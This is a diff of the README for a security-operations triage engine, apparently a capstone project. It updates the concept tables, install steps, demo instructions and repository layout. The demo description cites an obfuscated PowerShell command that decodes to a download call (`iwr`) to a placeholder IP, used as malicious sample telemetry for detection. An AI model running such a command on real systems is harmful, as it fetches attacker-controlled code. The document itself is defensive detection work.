@@ -89,15 +89,26 @@ Untrusted telemetry text is **never** placed into an instruction channel. The re
 
 This project implements **5 core backend concepts** required by the FlyRank Backend Capstone brief (including 1 approved swap):
 
-| # | Concept | Implementation Location | Description |
-| :-: | :--- | :--- | :--- |
-| **1** | **API Endpoints** | [`src/ingestion/api.py`](file:///home/heitor/endpoint-arbiter/src/ingestion/api.py) | High-performance FastAPI REST interface with strict Pydantic v2 contract validation, automated OpenAPI docs, and error handling (`/api/v1/triage`, `/api/v1/artifacts`). |
-| **2** | **Database** | [`src/persistence/storage.py`](file:///home/heitor/endpoint-arbiter/src/persistence/storage.py) | Real persistence engine powered by DuckDB storing raw canonical events and immutable triage artifacts with structured querying. |
-| **3** | **Caching Logic** | [`src/enrichment/enricher.py`](file:///home/heitor/endpoint-arbiter/src/enrichment/enricher.py) | In-memory observable intelligence cache supporting frozen fixtures (Contract B) with snapshot metadata and TTL enforcement to prevent quota exhaustion and ensure offline reproducibility. |
-| **4** | **LLM Integration** | [`src/llm/extractor.py`](file:///home/heitor/endpoint-arbiter/src/llm/extractor.py), [`schemas/extractor.py`](file:///home/heitor/endpoint-arbiter/schemas/extractor.py) | Quarantined AI extraction service parsing attacker-controlled text into closed categorical schemas with heuristic/LLM prompt injection detection. |
-| **5** | **Test Suite (Swap 1)** | [`tests/`](file:///home/heitor/endpoint-arbiter/tests/) | Deterministic test suite covering Pydantic contract boundaries, UTF-16LE Base64 decoders, end-to-end integration, and Safety Invariant I1 anti-tampering proofs. |
+| Concept | Location in Code |
+| :--- | :--- |
+| API Endpoints | src/ingestion/api.py |
+| Database / Persistence | src/persistence/storage.py |
+| Caching Logic | src/enrichment/enricher.py |
+| LLM Integration | src/llm/extractor.py |
+| Test Suite (Swap 1) | tests/ |
+
+### Detailed Concept Implementation Details
+
+| Concept | Implementation Location | Architectural Description |
+| :--- | :--- | :--- |
+| **API Endpoints** | [`src/ingestion/api.py`](file:///home/heitor/endpoint-arbiter/src/ingestion/api.py) | High-performance FastAPI REST interface with strict Pydantic v2 contract validation, automated OpenAPI docs, and error handling (`/api/v1/triage`, `/api/v1/artifacts`). |
+| **Database / Persistence** | [`src/persistence/storage.py`](file:///home/heitor/endpoint-arbiter/src/persistence/storage.py) | Real persistence engine powered by DuckDB storing raw canonical events and immutable triage artifacts with structured querying. |
+| **Caching Logic** | [`src/enrichment/enricher.py`](file:///home/heitor/endpoint-arbiter/src/enrichment/enricher.py) | In-memory observable intelligence cache supporting frozen fixtures (Contract B) with snapshot metadata and TTL enforcement to prevent quota exhaustion and ensure offline reproducibility. |
+| **LLM Integration** | [`src/llm/extractor.py`](file:///home/heitor/endpoint-arbiter/src/llm/extractor.py), [`schemas/extractor.py`](file:///home/heitor/endpoint-arbiter/schemas/extractor.py) | Quarantined AI extraction service parsing attacker-controlled text into closed categorical schemas with heuristic/LLM prompt injection detection, token tracking, and structured cost logging ($0 stack compliant). |
+| **Test Suite (Swap 1)** | [`tests/`](file:///home/heitor/endpoint-arbiter/tests/) | Deterministic test suite covering Pydantic contract boundaries, UTF-16LE Base64 decoders, end-to-end integration, and Safety Invariant I1 anti-tampering proofs. |
 
 > **Swap Rationale:** *User Authentication was swapped for an Automated Security Test Suite, because SOC triage engines operate as service-to-service backend middleware processing high-throughput telemetry streams, where automated verification of security boundaries, tamper resistance, and contract compliance is the critical requirement.*
+
 
 ---
 
@@ -149,7 +160,7 @@ source .venv/bin/activate
 
 # Install dependencies
 pip install --upgrade pip
-pip install fastapi uvicorn pydantic duckdb requests rich pytest hypothesis ruff
+pip install -r requirements.txt
 ```
 
 ---
@@ -158,7 +169,7 @@ pip install fastapi uvicorn pydantic duckdb requests rich pytest hypothesis ruff
 
 Follow these simple steps to run and verify the complete solution in under 5 minutes:
 
-### Step 1: Launch the API Server
+### Option A: Standard Multi-Terminal Live Run
 In your first terminal, start the FastAPI engine:
 
 ```bash
@@ -167,15 +178,20 @@ uvicorn src.ingestion.api:app --reload --port 8000
 ```
 *The service will initialize the DuckDB database at `data/arbiter.duckdb` and listen on port 8000.*
 
----
-
-### Step 2: Run the Automated Showcase Script
 In a second terminal, execute the interactive demonstration script:
 
 ```bash
 source .venv/bin/activate
 python scripts/demo.py
 ```
+
+### Option B: Zero-Config Standalone Offline Run ($0 Stack Stranger Test)
+The demo script automatically detects if the live server is running. If not, it executes seamlessly in-process via FastAPI's `TestClient` without throwing any exceptions:
+
+```bash
+python scripts/demo.py
+```
+
 
 #### What the Demo Proves:
 1. **Scenario 1 (Malicious Telemetry Ingestion):** Submits [`fixtures/contract_a_valid.json`](file:///home/heitor/endpoint-arbiter/fixtures/contract_a_valid.json). The normalizer de-obfuscates the Base64 UTF-16LE command `powershell.exe -nope aQB3...` into `iwr 198.51.100.42/u`, matches IP `198.51.100.42` against frozen reputation intelligence (Score 88), and emits an immutable Contract C artifact with a **Malicious** verdict and a **P0 Isolate Host** recommendation.
@@ -254,11 +270,20 @@ Endpoint Arbiter is developed as part of a formal research design for **Trustwor
 
 ---
 
+## Scope Guard: Capstone Deliverable vs. Post-Capstone Roadmap
+
+> **Evaluation Clarification:** In alignment with the FlyRank Capstone rubric favoring a hardened, production-grade vertical slice over incomplete features:
+> - **Primary Capstone Deliverable (Phase 1):** The hardened ingestion pipeline (`src/ingestion/api.py`), deterministic normalizer & UTF-16LE Base64 decoder (`src/normalizer/decoder.py`), observable enrichment cache (`src/enrichment/enricher.py`), quarantined Tier C extractor with token cost logging (`src/llm/extractor.py`), privileged arbiter enforcing Invariants I1–I5 (`src/arbiter/arbiter.py`), and DuckDB persistence (`src/persistence/storage.py`).
+> - **Post-Capstone Research Roadmap (Phases 2–4):** The directories [`src/rules/`](src/rules/), [`src/ml/`](src/ml/), and [`src/eval/`](src/eval/) are architectural research scaffolds reserved for subsequent research phases (external Sigma compiler integration, calibrated statistical ML classifiers, and automated multi-split benchmark suites). They do not represent incomplete capstone deliverables.
+
+---
+
 ## Repository Structure
 
 ```
 endpoint-arbiter/
 ├── README.md                      # Project documentation and quickstart
+├── requirements.txt               # Pinned project dependencies
 ├── data/                          # Persistent storage directory
 │   └── arbiter.duckdb             # DuckDB database file
 ├── docs/                          # Scientific specifications and decision records
@@ -272,9 +297,9 @@ endpoint-arbiter/
 │   └── contract_d_valid.json      # Benchmark record fixture
 ├── schemas/                       # Pydantic v2 data contracts
 │   ├── contracts.py               # Contracts A, B, C, D schemas and enums
-│   └── extractor.py               # ExtractorOutput schema for quarantined LLM
+│   └── extractor.py               # ExtractorOutput & CostLog schemas
 ├── scripts/                       # Runnable demonstration scripts
-│   └── demo.py                    # Interactive multi-scenario console showcase
+│   └── demo.py                    # Interactive multi-scenario console showcase ($0 stack)
 ├── src/                           # Core engine implementation
 │   ├── arbiter/                   # Privileged Reasoner enforcing Invariants I1-I5
 │   │   └── arbiter.py             # Arbiter logic combining tiers into verdicts
@@ -283,16 +308,20 @@ endpoint-arbiter/
 │   ├── ingestion/                 # API ingestion layer
 │   │   └── api.py                 # FastAPI application routes (/triage, /artifacts)
 │   ├── llm/                       # Tier C quarantined reasoning
-│   │   └── extractor.py           # Quarantined Extractor isolating raw text
+│   │   └── extractor.py           # Quarantined Extractor with token & cost logging
 │   ├── normalizer/                # Telemetry normalization and de-obfuscation
 │   │   └── decoder.py             # PowerShell Base64 UTF-16LE deterministic decoder
-│   └── persistence/               # Database management
-│       └── storage.py             # DuckDB event and artifact storage manager
-└── tests/                         # Automated test suite
+│   ├── persistence/               # Database management
+│   │   └── storage.py             # DuckDB event and artifact storage manager
+│   ├── rules/                     # [Roadmap Phase 2] Deterministic Sigma rule engine scaffold
+│   ├── ml/                        # [Roadmap Phase 3] Calibrated ML classifier scaffold
+│   └── eval/                      # [Roadmap Phase 4] Multi-split benchmark suite scaffold
+└── tests/                         # Automated test suite (Swap 1)
     ├── test_contracts.py          # Contract schema conformance tests
     ├── test_decoder.py            # De-obfuscation unit tests
     └── test_pipeline_e2e.py       # End-to-end integration & Invariant I1 tests
 ```
+
 
 ---
 
